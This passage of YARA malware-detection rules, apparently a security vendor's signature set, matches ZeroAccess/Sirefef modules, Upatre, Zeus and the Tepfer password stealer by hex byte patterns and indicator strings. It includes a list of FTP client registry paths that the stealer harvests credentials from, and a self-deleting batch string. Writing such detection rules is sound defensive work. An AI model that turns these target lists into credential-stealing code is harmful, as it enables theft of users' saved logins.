$hex7 = { 55 8b ec 83 ec 64 53 56 57 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? ff ?? ?? ff ?? ?? e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 33 db 53 53 ff ?? ?? ?? ?? ?? 50 68 4d 10 40 00 53 53 53 53 53 6a ff ff ?? ?? ?? ?? ?? b8 00 04 00 00 e8 ?? ?? ?? ?? 8b f4 89 ?? ?? 89 ?? ?? e9 ?? ?? ?? ?? 8d ?? ?? 50 56 c7 ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 83 ?? ?? ?? 75 ?? 6a 30 53 ff ?? ?? ?? ?? ?? 3b c3 74 ?? 8b ?? ?? 8b ?? ?? 89 ?? ?? 89 ?? ?? 89 ?? ?? c6 ?? ?? ?? 8d ?? ?? 89 ?? ?? 89 ?? 8d ?? ?? 89 ?? ?? 89 ?? 8b ?? ?? ?? ?? ?? 89 ?? c7 ?? ?? ?? ?? ?? ?? 89 ?? ?? a3 ?? ?? ?? ?? eb ?? 33 c0 3b c3 74 ?? 8d ?? ?? e8 ?? ?? ?? ?? ff ?? ?? e9 ?? ?? ?? ?? ff ?? ?? ff ?? ?? ?? ?? ?? e9 ?? ?? ?? ?? a1 ?? ?? ?? ?? b9 38 90 42 00 eb ?? 8b ?? ?? 3b ?? ?? 74 ?? 8b ?? 3b c1 75 ?? 33 ff 3b fb 0f ?? ?? ?? ?? ?? 8b ?? ?? 48 74 ?? 48 74 ?? 48 48 74 ?? 48 74 ?? 48 74 ?? 48 74 ?? 48 75 ?? 57 8d ?? ?? e8 ?? ?? ?? ?? eb ?? 8b f8 eb ?? 8d ?? ?? 8b ?? eb ?? 8b ?? ?? 3b ?? ?? 74 ?? 8b ?? 3b c1 75 ?? 33 c0 3b c3 74 ?? 8b f0 e8 ?? ?? ?? ?? eb ?? 8d ?? ?? 50 e8 ?? ?? ?? ?? eb ?? e8 ?? ?? ?? ?? ff ?? ?? eb ?? ff ?? ?? 8b cf e8 ?? ?? ?? ?? 3b c3 74 ?? 8b f0 e8 ?? ?? ?? ?? eb ?? 57 8d ?? ?? e8 ?? ?? ?? ?? eb ?? 8d ?? ?? e8 ?? ?? ?? ?? 89 ?? ?? ff ?? ?? 8b ?? ?? 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 39 ?? ?? 74 ?? 53 56 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8d ?? ?? 5f 5e 5b c9 c2 08 00}
$hex8 = { 53 56 57 ff ?? ?? ?? ?? ?? 0f b7 c0 33 ff 57 6a 04 8b c8 68 04 e2 41 00 c1 e9 08 c0 e0 04 6a 1a 0a c8 6a ff 88 ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b d8 6a 3c 53 ff d6 59 59 85 c0 74 ?? e8 ?? ?? ?? ?? 85 c0 75 ?? 57 e8 ?? ?? ?? ?? 68 a4 e0 41 00 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 6a 3e 53 ff d6 59 59 85 c0 74 ?? 6a 01 e8 ?? ?? ?? ?? eb ?? 8b ?? ?? ?? ?? ?? b8 00 20 00 00 66 ?? ?? ?? ?? ?? ?? 75 ?? e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 68 e8 03 00 00 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 8b ?? ?? ?? 2b c7 74 ?? 48 75 ?? ff ?? ?? ?? ff ?? ?? ?? ?? ?? 33 c0 40 e8 ?? ?? ?? ?? 8b f0 e8 ?? ?? ?? ?? 85 c0 74 ?? e8 ?? ?? ?? ?? 85 c0 75 ?? 57 57 56 68 10 1c 40 00 57 57 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? eb ?? e8 ?? ?? ?? ?? 5f 5e b0 01 5b c2 0c 00}
$hex9 = { 55 8b ec 83 e4 f8 81 ec 94 01 00 00 53 56 57 68 c0 bb 41 00 68 d4 bb 41 00 ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8b d8 85 db 75 ?? 8b ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8d ?? ?? ?? 50 6a 40 6a 07 8d ?? ?? 56 ff d7 85 c0 74 ?? b8 91 1b 40 00 2b c6 83 e8 05 89 ?? ?? 8d ?? ?? ?? 50 ff ?? ?? ?? c6 ?? ?? 6a 07 56 c6 ?? ?? ?? c6 ?? ?? ?? ff d7 8d ?? ?? ?? 50 68 02 02 00 00 ff ?? ?? ?? ?? ?? 6a 0d e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? ff ?? ?? ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 68 90 e0 41 00 6a 01 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? 50 6a 40 6a 02 53 ff d7 85 c0 74 ?? b8 8b ff 00 00 66 ?? ?? 8d ?? ?? ?? 50 ff ?? ?? ?? 6a 02 53 ff d7 5f 5e 33 c0 5b 8b e5 5d c2 04 00}
$hex10 ={ 55 8b ec 83 ec 18 a0 ?? ?? ?? ?? 83 ?? ?? ?? 83 ?? ?? ?? 53 56 0f b6 c0 57 c7 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? 8b ?? ?? 39 ?? ?? 73 ?? 2b ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? 2b c4 89 ?? ?? 89 ?? ?? 8b ?? ?? 8d ?? ?? 50 ff ?? ?? 53 6a 05 ff ?? ?? ?? ?? ?? 89 ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 33 c0 03 d8 6a 01 8d ?? ?? 57 68 e8 c1 41 00 ff d6 84 c0 75 ?? 6a 01 57 68 08 c2 41 00 ff d6 84 c0 75 ?? 6a 01 57 68 2c c2 41 00 ff d6 84 c0 75 ?? 6a 01 57 68 4c c2 41 00 ff d6 84 c0 75 ?? 6a 01 57 68 6c c2 41 00 ff d6 84 c0 75 ?? 6a 01 57 68 8c c2 41 00 ff d6 84 c0 74 ?? 8d ?? ?? ?? ?? ?? 50 68 00 e0 41 00 6a 01 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 7c ?? 6a 00 ff ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ff ?? ?? ?? ?? ?? 8b ?? 85 c0 0f ?? ?? ?? ?? ?? 81 ?? ?? ?? ?? ?? ?? 0f ?? ?? ?? ?? ?? 8d ?? ?? 5f 5e 5b c9 c3}
$hex11 ={ 55 8b ec 81 ec ac 00 00 00 53 56 57 6a 20 6a 07 8d ?? ?? 50 68 6c e0 41 00 68 89 00 12 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 8b d8 85 db 0f ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 6a 05 6a 10 8d ?? ?? 50 8d ?? ?? 50 ff ?? ?? ff d6 8b d8 bf 05 00 00 80 3b df 74 ?? 85 db 75 ?? 8b ?? ?? b8 80 00 04 00 23 c8 3b c8 75 ?? 6a 01 6a 18 8d ?? ?? 50 8d ?? ?? 50 ff ?? ?? ff d6 3b c7 74 ?? 85 c0 75 ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 6a 08 8d ?? ?? 50 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 6a 10 8d ?? ?? 50 68 14 e2 41 00 e8 ?? ?? ?? ?? 83 c4 0c 33 db eb ?? bb bb 00 00 c0 ff ?? ?? ff ?? ?? ?? ?? ?? 85 db 7d ?? 81 cb 00 00 01 00 5f 5e 8b c3 5b c9 c3}
condition:
(5 of them) or (any of ($hex*)) or (any of ($s*))
}
rule SSC_TrojanSirefefZerroAccessANModule
{
meta:
Description  = "Trojan.Sirefef.sm"
ThreatLevel  = "5"
strings:
$ = "%s\\%s\\%08x.@" ascii wide
$ = "%s\\%s\\%s" ascii wide
$ = "InstallFlashPlayer.exe" ascii wide
$ = "get/flashplayer/update/current/install/install_all_win_%s_sgn.z" ascii wide
$ = "download/C/C/0/CC0BD555-33DD-411E-936B-73AC6F95AE11/IE8-WindowsXP-x86-ENU.exe" ascii wide
$ = "\\??\\%08x" ascii wide
$ = "80000032.32" ascii wide
$ = "\\GLOBAL??\\{D1C8BD9B-9DF7-4fb6-A1C3-D96202C79FC0}" ascii wide
$ = "http://%.*s/_ylt=3648C868A1DB;" ascii wide
$hex0 = { 56 8b ?? ?? ?? 33 c0 8d ?? ?? 87 ?? 85 c0 74 ?? 6a 00 50 6a 00 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 8d ?? ?? 83 c8 ff f0 ?? ?? ?? 75 ?? 85 f6 74 ?? 8b ?? 8b ?? 6a 01 8b ce ff d0 83 c8 ff 8d ?? ?? 87 ?? 83 f8 ff 74 ?? 50 ff ?? ?? ?? ?? ?? 8b ?? 8b ?? ?? 8b ce ff d0 8d ?? ?? 83 ca ff f0 ?? ?? ?? 75 ?? 85 f6 74 ?? 8b ?? 8b ?? 6a 01 8b ce ff d2 5e c2 08 00}
$hex1 = { 57 8b ?? ?? ?? ?? ?? 68 30 75 00 00 ff d7 a1 ?? ?? ?? ?? 85 c0 74 ?? 56 eb ?? 8d 9b 00 00 00 00 68 30 75 00 00 8b f0 ff d7 a1 ?? ?? ?? ?? 3b f0 75 ?? 5e 6a 00 ff ?? ?? ?? ?? ??}
$hex2 = { 83 ec 5c 56 8d ?? ?? ?? 50 68 ff 01 0f 00 83 ce ff 56 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? ?? 57 8d ?? ?? ?? 51 6a 01 6a 00 68 90 61 01 10 68 ff 01 0f 00 52 ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 85 c0 78 ?? 8b ?? ?? ?? 6a 04 8d ?? ?? ?? 50 6a 0c 51 ff ?? ?? ?? ?? ?? 6a 40 8d ?? ?? ?? 6a 00 52 c7 ?? ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? ?? 83 c4 0c 8d ?? ?? ?? 50 8b ?? ?? ?? 8d ?? ?? ?? 51 6a 00 6a 00 6a 00 6a 00 6a 00 6a 00 52 6a 00 50 c7 ?? ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 85 c0 74 ?? 8b ?? ?? ?? 51 ff d7 8b ?? ?? ?? 8b ?? ?? ?? 52 ff d7 8b ?? ?? ?? 50 ff d7 5f 8b c6 5e 83 c4 5c c2 08 00}
$hex3 = { 56 8b f2 e8 ?? ?? ?? ?? 85 c0 74 ?? 83 ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? 89 ?? ?? ?? ?? ?? 75 ?? e8 ?? ?? ?? ?? 6a 00 6a 00 6a 00 68 20 8b 00 10 6a 00 6a 00 ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? b8 01 00 00 00 5e c3 33 c0 5e c3}
$hex4 = { 53 8b d9 8b ca e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 56 68 20 ca 01 10 ff ?? ?? ?? ?? ?? 8b f0 ff ?? ?? ?? ?? ?? ba f8 34 01 10 8b ce 57 8b ff 66 ?? ?? 66 ?? ?? 75 ?? 66 85 ff 74 ?? 66 ?? ?? ?? 66 ?? ?? ?? 75 ?? 83 c1 04 83 c2 04 66 85 ff 75 ?? 33 c9 eb ?? 1b c9 83 d9 ff 85 c9 75 ?? 68 10 35 01 10 50 ff ?? ?? ?? ?? ?? 83 c4 08 85 c0 74 ?? 68 30 be 00 10 c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 6a 00 6a 00 68 b0 04 00 00 68 a0 89 00 10 6a 00 6a 00 ff d6 8b ?? ?? ?? ?? ?? 50 ff d7 e8 ?? ?? ?? ?? 6a 00 6a 00 6a 00 68 20 83 00 10 6a 00 6a 00 ff d6 50 ff d7 5f 5e b8 01 00 00 00 5b c3 e8 ?? ?? ?? ?? 85 c0 74 ?? 68 30 be 00 10 c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 8b c3 e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 6a 00 6a 00 6a 00 68 80 bd 00 10 6a 00 6a 00 ff ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 5f 5e b8 01 00 00 00 5b c3 5f 5e 33 c0 5b c3 83 ?? ?? ?? ?? ?? ?? 74 ?? 8b c3 e8 ?? ?? ?? ?? b8 01 00 00 00 5b c3 33 c0 5b c3}
condition:
(5 of them) or (any of ($hex*))
}
rule SSC_TrojanSirefefZerroAccessPlayloadModule
{
meta:
Description  = "Trojan.Sirefef.sm"
ThreatLevel  = "5"
strings:
$ = "U\\80000032.@" ascii wide
$ = "\\\\.\\globalroot\\systemroot\\system32\\mswsock.dll" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.AcceptEx" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.GetAcceptExSockaddrs" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.NSPStartup" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.TransmitFile" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.getnetbyname" ascii wide
$ = "\\\\?\\globalroot\\systemroot\\system32\\mswsock.inet_network" ascii wide
$ = "%sU\\%08x.@" ascii wide
$ = "\\??\\%s@" ascii wide
$ = "\\??\\%sU" ascii wide
$ = "\\registry\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters" ascii wide
$ = "\\KnownDlls\\mswsock.dll" ascii wide
$ = "\\systemroot\\assembly" ascii wide
$ = "GAC_MSIL" ascii wide
$ = "GAC" ascii wide
$ = "????????.@" ascii wide
$ = "%08x.@" ascii wide
$ = "%08x.$" ascii wide
$ = "%08x.~" ascii wide
$ = "\\systemroot\\assembly\\GAC\\Desktop.ini" ascii wide
condition:
(5 of them)
}
rule SSC_TrojanSirefefZerroAccessPluginModule
{
meta:
Description  = "Trojan.Sirefef.sm"
ThreatLevel  = "5"
strings:
$hex0 = { 55 8b ec 81 ec 94 01 00 00 56 68 30 40 00 10 68 00 00 10 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 8b f0 81 fe 00 00 00 40 75 ?? ff ?? ?? ff ?? ?? ?? ?? ?? 85 f6 8b ?? ?? ?? ?? ?? 7c ?? 8d ?? ?? ?? ?? ?? 50 68 02 02 00 00 ff ?? ?? ?? ?? ?? 85 c0 75 ?? e8 ?? ?? ?? ?? 6a 20 68 60 ea 00 00 b9 80 40 00 10 e8 ?? ?? ?? ?? 69 c0 e8 03 00 00 50 6a 00 68 b7 15 00 10 6a 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 74 ?? ff ?? ?? ff ?? ?? ?? ?? ?? 6a ff ff ?? ?? 6a 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ff d6 a1 ?? ?? ?? ?? 85 c0 74 ?? b9 fb 15 00 10 ff ?? ?? e8 ?? ?? ?? ?? 68 28 40 00 10 6a 01 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? ff d6}
$hex1 = { 81 ?? ?? ?? ?? ?? 56 57 8b f9 75 ?? b9 fb 15 00 10 89 ?? ?? ?? ?? ?? ff ?? ?? 8b ?? ?? ?? ?? ?? 68 08 32 00 10 57 ff d6 59 59 50 b9 80 40 00 10 e8 ?? ?? ?? ?? 68 f0 31 00 10 57 ff d6 59 59 33 c9 8b d0 41 e8 ?? ?? ?? ?? 33 c0 50 50 50 68 85 16 00 10 50 50 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 33 c0 5f 40 5e c3}
$hex2 = { 55 8b ec 81 ec 90 00 00 00 53 56 57 6a 40 5e 8b d9 6a 04 8b c6 66 ?? ?? ?? 58 33 ff 57 66 ?? ?? ?? 57 8d ?? ?? 50 ff ?? ?? c7 ?? ?? ?? ?? ?? ?? c6 ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? c6 ?? ?? ?? ff ?? ?? ?? ?? ?? 84 c0 0f ?? ?? ?? ?? ?? 6a 20 8d ?? ?? 6a 07 89 ?? ?? 8d ?? ?? 50 8d ?? ?? 50 89 ?? ?? 68 98 00 10 00 8d ?? ?? 56 c7 ?? ?? ?? ?? ?? ?? 89 ?? ?? 89 ?? ?? 89 ?? ?? ff ?? ?? ?? ?? ?? 85 c0 7c ?? 57 57 6a 18 68 0c 40 00 10 57 6a 60 8d ?? ?? ?? ?? ?? 50 8d ?? ?? 50 ff ?? e8 ?? ?? ?? ?? 85 c0 7c ?? 8d ?? ?? ?? ?? ?? 33 c9 03 c1 80 ?? ?? ?? 75 ?? 8b ?? ?? 81 f9 30 30 31 00 74 ?? 81 f9 30 30 32 00 75 ?? 66 ?? ?? ?? ?? 75 ?? 8b ?? ?? 89 ?? ?? eb ?? 66 ?? ?? ?? ?? 75 ?? 6a 10 8d ?? ?? 8d ?? ?? 59 f3 ?? 33 ff 8b ?? 3b cf 75 ?? 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 66 ?? ?? ?? 75 ?? e8 ?? ?? ?? ?? 33 d2 b9 80 51 01 00 f7 f1 6a 4c 53 66 ?? ?? ?? 8d ?? ?? 50 ff ?? ?? e8 ?? ?? ?? ?? 39 ?? ?? 75 ?? c7 ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 57 8b cb 89 ?? ?? e8 ?? ?? ?? ?? 5f 5e 5b c9 c2 04 00}
$hex3 = { 55 8b ec 83 ec 74 53 56 57 be 30 00 fe 7f 56 ff ?? ?? ?? ?? ?? 59 8d ?? ?? ?? e8 ?? ?? ?? ?? 89 ?? ?? 68 94 60 00 10 56 ff ?? ?? ff ?? ?? ?? ?? ?? 59 59 50 ff ?? ?? ?? ?? ?? 59 59 33 db 53 53 ff ?? ?? ?? ?? ?? 8b f0 3b f3 0f ?? ?? ?? ?? ?? 6a 70 8d ?? ?? 53 50 e8 ?? ?? ?? ?? 83 c4 0c 6a 70 8d ?? ?? 50 33 ff 6a 09 47 56 c7 ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? 89 ?? ?? c7 ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 85 c0 74 ?? ff ?? ?? ?? ?? ?? 85 c0 74 ?? 9c 81 ?? ?? ?? ?? ?? ?? 9d 90 68 08 70 00 10 57 8b ?? ?? ?? ?? ?? ff d7 85 c0 75 ?? 38 ?? ?? ?? ?? ?? 75 ?? ff ?? ?? ff ?? ?? 56 e8 ?? ?? ?? ?? 38 ?? ?? ?? ?? ?? 75 ?? 68 00 70 00 10 6a 01 ff d7 85 c0 74 ?? 56 ff ?? ?? ?? ?? ?? 33 c0 8d ?? ?? 5f 5e 5b c9 c2 04 00}
$hex4 = { 55 8b ec 51 53 56 57 68 24 70 00 10 68 00 00 10 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 8b f8 81 ff 00 00 00 40 75 ?? ff ?? ?? ff ?? ?? ?? ?? ?? 33 f6 3b fe 7c ?? 56 56 ff ?? ?? 68 88 13 00 10 56 56 ff ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 8b f8 3b fe 74 ?? ff ?? ?? ff ?? ?? ?? ?? ?? 57 c6 ?? ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 56 56 57 ff ?? ?? ?? ?? ?? 57 ff d3 ff ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ff d3 ff ?? ?? ff ?? ?? ?? ?? ??}
$hex5 = { 53 56 57 8b d9 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 9c 81 ?? ?? ?? ?? ?? ?? 9d 90 53 ff ?? ?? ?? ?? ?? 59 6a 02 5a 8d ?? ?? ?? 33 c9 f7 e2 0f 90 c1 33 ff f7 d9 0b c1 50 57 ff ?? ?? ?? ?? ?? 8b f0 3b f7 74 ?? 53 68 50 61 00 10 56 ff ?? ?? ?? ?? ?? 83 c4 0c 57 57 56 68 77 14 00 10 57 57 ff ?? ?? ?? ?? ?? 3b c7 74 ?? 50 ff ?? ?? ?? ?? ?? 33 c0 40 eb ?? 56 ff ?? ?? ?? ?? ?? 33 c0 5f 5e 5b c3}
condition:
any of ($hex*)
}
rule SSC_TrojanSirefefZerroAccessPluginModuleZooCliccer
{
meta:
Description  = "Trojan.ZooClicker.sm"
ThreatLevel  = "5"
strings:
$ = "%s\\00000001.@" ascii wide
$ = "z00clicker3"  ascii wide
$ = "z00clicker"  ascii wide
condition:
any of them
}
rule SSC_TrojanSirefefZerroAccess2016
{
meta:
Description  = "Trojan.Sirefef.E.sm"
ThreatLevel  = "5"
strings:
$ = "GoogleUpdate.exe" ascii wide
$ = "%08x.@" ascii wide
$ = "%08x.$" ascii wide
$ = "%08x.~" ascii wide
$s1 = "\\Google\\Desktop\\Install\\{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}\\#." ascii wide
$s2 = "\\BaseNamedObjects\\Restricted\\{12E9D947-EDF5-4191-AADB-F51815F004D8}" ascii wide
$s3 = "\\BaseNamedObjects\\Restricted\\{889E2280-F15E-4330-A3F4-D4EEF899AAF6}" ascii wide
$s4 = "\\BaseNamedObjects\\Restricted\\{1FD06E7A-B215-4ae2-B209-AC869A3DF0B7}" ascii wide
$s5 = "\\BaseNamedObjects\\Restricted\\{A3D35150-6823-4462-8C6E-7417FF841D7A}" ascii wide
$s6 = "80000000.@" ascii wide
$s7 = "=cccctp=ddddt:=rrrrt<=sssst" ascii wide
$s8 = "=ccccta=ddddt+=rrrrt-=sssst" ascii wide
condition:
(3 of them) or (any of ($s*))
}rule SSC_TrojanUpatreSample
{
meta:
Description = "Trojan.Upatre.vb"
ThreatLevel = "5"
strings:
$hex_string = { 52 ba 6c 6c 00 00 52 ba 73 66 2e 64 52 ba 32 5c 71 61 52 ba 74 65 6d 33 52 ba 5c 73 79 73 52}
condition:
$hex_string
}rule SSC_TrojanVirtoolObfuscator
{
meta:
Description = "Trojan.Obfuscator.rc"
ThreatLevel = "5"
strings:
$ = "1346243623461" ascii wide
$ = "3nterface" ascii wide
condition:
all of them
}rule SSC_TrojanPSWTepferSample
{
meta:
Description  = "Trojan.Tepfer.sm"
ThreatLevel  = "5"
strings:
$ = "Software\\BPFTP"                                    ascii wide
$ = "\\BulletProof Software\\BulletProof FTP Client"     ascii wide
$ = "Software\\BPFTP\\Bullet Proof FTP"                  ascii wide
$ = "Software\\NCH Software\\ClassicFTP\\FTPAccounts"    ascii wide
$ = "\\GlobalSCAPE\\CuteFTP"                             ascii wide
$ = "\\GlobalSCAPE\\CuteFTP Pro"                         ascii wide
$ = "\\GlobalSCAPE\\CuteFTP Lite"                        ascii wide
$ = "\\CuteFTP"                                          ascii wide
$ = "\\GPSoftware\\Directory Opus\\ConfigFiles\\ftp.oxc" ascii wide
$ = "SOFTWARE\\Far\\Plugins\\FTP\\Hosts"                 ascii wide
$ = "SOFTWARE\\Far2\\Plugins\\FTP\\Hosts"                ascii wide
$ = "Software\\Far\\Plugins\\FTP\\Hosts"                 ascii wide
$ = "Software\\Far2\\Plugins\\FTP\\Hosts"                ascii wide
$ = "Software\\Far\\SavedDialogHistory\\FTPHost"         ascii wide
$ = "Software\\Far2\\SavedDialogHistory\\FTPHost"        ascii wide
$ = "Software\\Ghisler\\Windows Commander"				 ascii wide
$ = "Software\\Ghisler\\Total Commander"				 ascii wide
$ = "Software\\Sota\\FFFTP"                              ascii wide
$ = "Software\\FileZilla"                                ascii wide
$ = "FileZilla3"                                         ascii wide
$ = "FlashFXP"                                           ascii wide
$ = "FTP Commander Pro"                                  ascii wide
$ = "FTP Navigator"                                      ascii wide
$ = "FTP Commander"                                      ascii wide
$ = "FTP Commander Deluxe"                               ascii wide
$ = "Software\\FTP Explorer\\Profiles"                   ascii wide
$ = "\\FTP Explorer\\profiles.xml"                       ascii wide
$ = "Windows/Total Commander"                            ascii wide
$ = "FTP Commander"                                      ascii wide
$ = "BulletProof FTP Client"                             ascii wide
$ = "TurboFTP"                                           ascii wide
$ = "SoftX FTP Client"                                   ascii wide
$ = "LeapFTP"                                            ascii wide
$ = "WinSCP"                                             ascii wide
$ = "32bit FTP"                                          ascii wide
$ = "FTP Control"                                        ascii wide
$ = "SecureFX"                                           ascii wide
$ = "BitKinex"                                           ascii wide
$ = "CuteFTP"                                            ascii wide
$ = "WS_FTP"                                             ascii wide
$ = "FFFTP"                                              ascii wide
$ = "Core FTP"                                           ascii wide
$ = "WebDrive"                                           ascii wide
$ = "Classic FTP"                                        ascii wide
$ = "Fling"                                              ascii wide
$ = "NetDrive"                                           ascii wide
$ = "FileZilla"                                          ascii wide
$ = "FTP Explorer"                                       ascii wide
$ = "SmartFTP"                                           ascii wide
$ = "FTPRush"                                            ascii wide
$ = "UltraFXP"                                           ascii wide
$ = "Frigate3 FTP"                                       ascii wide
$ = "BlazeFtp"				ascii wide
$ = "Software\\LeechFTP"	ascii wide
$ = "SiteInfo.QFP"			ascii wide
$ = "WinFTP"				ascii wide
$ = "FreshFTP"				ascii wide
$ = "BlazeFtp"				ascii wide
condition:
9 of them
}rule SSC_TrojanZeusZbotSampleA
{
meta:
Description  = "Trojan.ZBot.sm"
ThreatLevel  = "5"
strings:
$ = "-m" ascii wide
$ = "-m%p" ascii wide
$ = ":d\\r\\ndel" ascii wide
$ = "@echo off\\r\\n%s\\r\\ndel /F" ascii wide
$hex0 = { 83 EC 0C 53 55 33 DB 56 8B C2 33 ED 57 89 44 24 18 89 4C 24 10 39 5C 24 20 0F 8E ?? ?? ?? ?? 8B 04 A8 83 3C C5 }
$hex1 = { E8 ?? ?? ?? ?? 83 C4 04 C7 45 FC 00 00 00 00 EB 09 8B 4D FC 83 C1 01 89 4D FC 8B 55 FC 3B 15 ?? ?? ?? ?? 0F 83 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? C7 45 F4 ?? ?? ?? ?? 8B 45 08 83 C0 08 A3 ?? ?? ?? ?? 8B 4D FC 51 8B 15 ?? ?? ?? ?? 52 E8 ?? ?? ?? ?? }
$hex2 = { 6A 02 6A 00 FF 15 ?? ?? ?? ?? 8B F0 85 F6 74 08 56 E8 ?? ?? ?? ?? EB 02 8A C3 84 C0 74 28 F6 44 24 36 08 75 0A E8 ?? ?? ?? ?? 83 4C 24 36 08 F6 44 24 36 40 75 0A E8 ?? ?? ?? ?? 83 4C 24 36 40 56 E8 ?? ?? ?? ?? 8D 44 24 08 50 E8 ?? ?? ?? ?? 8A C3 EB 02 32 C0 5E 5B 8B E5 5D C3 }
$hex3 = { 55 8b ec 81 ec 70 03 00 00 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 50 68 28 59 40 00 8d ?? ?? ?? ?? ?? 68 6c 02 00 00 50 e8 ?? ?? ?? ?? 83 c4 14 85 c0 7e ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 84 c0 74 ?? b0 01 eb ?? 32 c0 c9 c2 04 00}
$hex4 = { 55 8b ec 83 e4 f8 81 ec 4c 02 00 00 53 8b ?? ?? ?? ?? ?? 56 57 33 ff c6 ?? ?? ?? ?? 89 ?? ?? ?? 89 ?? ?? ?? 57 6a 02 e8 ?? ?? ?? ?? 89 ?? ?? ?? 89 ?? ?? ?? 83 f8 ff 0f ?? ?? ?? ?? ?? 8d ?? ?? ?? 50 ff ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b ?? ?? ?? 3b cf 0f ?? ?? ?? ?? ?? 3b ?? ?? ?? ?? ?? 0f ?? ?? ?? ?? ?? 33 c0 39 ?? ?? ?? 76 ?? 8b ?? ?? ?? 39 ?? ?? 0f ?? ?? ?? ?? ?? 40 3b ?? ?? ?? 72 ?? 51 e8 ?? ?? ?? ?? 89 ?? ?? ?? 3b c7 0f ?? ?? ?? ?? ?? ff ?? ?? ?? 57 68 00 04 00 00 ff ?? ?? ?? ?? ?? 8b f0 3b f7 0f ?? ?? ?? ?? ?? 8d ?? ?? ?? 50 56 e8 ?? ?? ?? ?? 56 8b f8 ff d3 85 ff 74 ?? 8b ?? ?? ?? 3b ?? ?? ?? ?? ?? 75 ?? ff ?? ff ?? ?? ?? ?? ?? 3b ?? ?? ?? ?? ?? 75 ?? 8b ?? 50 a1 ?? ?? ?? ?? 8b ?? e8 ?? ?? ?? ?? 85 c0 75 ?? 8b ?? ?? ?? 8d ?? ?? ?? ?? ?? ?? 50 8d ?? ?? ?? e8 ?? ?? ?? ?? 84 c0 74 ?? 8b ?? ?? ?? 8b ?? ?? ?? 8b ?? ?? ?? ff ?? ?? ?? ff ?? ?? ?? ff ?? 